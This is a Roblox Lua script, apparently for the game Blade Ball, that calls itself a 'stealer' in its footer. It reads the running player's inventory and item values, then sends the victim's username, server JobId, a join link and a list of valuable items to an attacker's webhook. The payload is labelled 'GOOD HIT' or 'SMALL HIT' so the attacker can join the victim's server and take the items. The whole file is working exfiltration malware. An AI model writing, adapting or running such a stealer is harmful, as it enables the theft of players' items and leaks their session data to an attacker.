-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- // FONCTION D'ENVOI POUR TON WORKER
local function sendToWorker(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = _G.webhook, 
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // FORMATAGE RAP (2.11k, etc.)
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
end

-- // SCAN ET GROUPAGE DE L'INVENTAIRE
local itemsFound = {}
local totalRAP = 0

local success, err = pcall(function()
    local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
    local Replion = require(ReplicatedStorage.Packages.Replion)
    local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
    local categories = {"Sword", "Emote", "Explosion"}

    for _, cat in ipairs(categories) do
        if clientInventory[cat] then
            for id, info in pairs(clientInventory[cat]) do
                local rap = 0
                if rapData[cat] then
                    for key, value in pairs(rapData[cat]) do
                        if string.find(key, info.Name) then
                            rap = value
                            break
                        end
                    end
                end
                
                if rap >= (_G.min_rap or 50) then
                    totalRAP = totalRAP + rap
                    table.insert(itemsFound, {Name = info.Name, RAP = rap})
                end
            end
        end
    end
end)

-- // PREPARATION DU PAYLOAD
if #itemsFound > 0 or totalRAP > 0 then
    -- Groupage (x1, x2...)
    local grouped = {}
    for _, item in ipairs(itemsFound) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return b.TotalRAP > a.TotalRAP end)

    local itemListText = ""
    for _, group in ipairs(groupedList) do
        itemListText = itemListText .. string.format("%s (x%d) - **%s RAP**\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local isGoodHit = totalRAP >= 500
    local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
    local embedColor = isGoodHit and 65280 or 8323327

    local workerPayload = {
        ["auth_token"] = "EBK-SS-A",
        ["username"] = webhookName,
        ["content"] = (_G.pingEveryone == "Yes" and "--[[@everyone]]\n" or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = embedTitle,
            ["color"] = embedColor,
            ["fields"] = {
                {["name"] = "Victim Username 🤖:", ["value"] = plr.Name, ["inline"] = true},
                {["name"] = "JobId 🆔:", ["value"] = "```" .. game.JobId .. "```", ["inline"] = true},
                {["name"] = "Join link 🔗:", ["value"] = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, ["inline"] = false},
                {["name"] = "Item list 📝:", ["value"] = itemListText ~= "" and itemListText or "None", ["inline"] = false},
                {["name"] = "Summary 💰:", ["value"] = "Total RAP: **" .. formatNumber(totalRAP) .. "**", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }

    sendToWorker(workerPayload)
end
